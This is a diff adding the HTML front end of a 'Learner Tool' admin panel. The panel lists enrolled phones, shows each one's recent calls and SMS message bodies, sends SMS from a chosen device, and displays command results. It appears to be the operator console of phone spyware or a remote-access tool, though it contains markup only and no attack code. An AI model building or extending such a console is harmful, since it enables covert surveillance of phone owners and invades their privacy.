@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Learner Tool – Admin Panel</title>
+  <link rel="stylesheet" href="styles.css" />
+  <!-- Firebase compat SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+</head>
+<body>
+  <header>
+    <h1>Learner Tool – Admin Panel</h1>
+  </header>
+
+  <main class="layout">
+    <section class="panel">
+      <h2>Devices</h2>
+      <table id="devicesTable">
+        <thead>
+          <tr>
+            <th>Name</th>
+            <th>Model</th>
+            <th>OS</th>
+            <th>Last Check-in</th>
+            <th>Actions</th>
+          </tr>
+        </thead>
+        <tbody id="devicesBody"></tbody>
+      </table>
+    </section>
+
+    <section class="panel" id="detailsPanel">
+      <h2 id="detailsTitle">Device Details</h2>
+
+      <div class="details-grid">
+        <div>
+          <h3>Profile</h3>
+          <pre id="profileBox">Select a device…</pre>
+        </div>
+        <div>
+          <h3>Send SMS</h3>
+          <form id="smsForm">
+            <label>
+              To:
+              <input type="tel" id="smsTo" placeholder="+92300..." required />
+            </label>
+            <label>
+              Message:
+              <textarea id="smsMessage" rows="4" maxlength="500" required></textarea>
+            </label>
+            <button type="submit">Send SMS</button>
+            <div id="smsStatus" class="muted"></div>
+          </form>
+        </div>
+      </div>
+
+      <div class="details-grid">
+        <div>
+          <h3>Recent Calls</h3>
+          <div class="scroll">
+            <table>
+              <thead>
+                <tr><th>When</th><th>Type</th><th>Number</th><th>Duration</th></tr>
+              </thead>
+              <tbody id="callsBody"></tbody>
+            </table>
+          </div>
+        </div>
+        <div>
+          <h3>Recent SMS</h3>
+          <div class="scroll">
+            <table>
+              <thead>
+                <tr><th>When</th><th>Dir</th><th>Number</th><th>Body</th></tr>
+              </thead>
+              <tbody id="smsBody"></tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <h3>Command Result</h3>
+        <pre id="lastResultBox" class="muted">No commands sent yet.</pre>
+      </div>
+    </section>
+  </main>
+
+  <script src="admin.js"></script>
+</body>
+</html>
